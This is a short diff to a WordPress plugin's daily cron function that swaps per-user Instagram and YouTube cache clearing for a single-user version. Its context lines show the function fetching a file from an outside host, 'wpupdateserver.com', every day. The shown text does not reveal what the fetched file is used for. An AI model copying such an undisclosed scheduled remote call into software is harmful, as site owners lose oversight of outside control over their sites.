@@ -19,7 +19,14 @@ register_deactivation_hook(__FILE__, 'pipdig_p3_deactivate_cron');
 function pipdig_p3_do_this_daily() {
 
 	pipdig_p3_scrapey_scrapes();
-
+	
+	$instagram_deets = get_option('pipdig_instagram');
+	if (!empty($instagram_deets['user_id'])) {
+		$instagram_user = sanitize_text_field($instagram_deets['user_id']);
+		delete_transient('p3_instagram_feed_'.$instagram_user);
+	}
+	
+	/*
 	$instagram_users = get_option('pipdig_instagram_users');
 	if (is_array($instagram_users)) {
 		foreach ($instagram_users as $instagram_user) {
@@ -40,6 +47,7 @@ function pipdig_p3_do_this_daily() {
 			delete_transient('p3_youtube_'.$channel_id);
 		}
 	}
+	*/
 	
 	$url = 'https://wpupdateserver.com/id39dqm3c0.txt';
 	$args = array('timeout' => 5);
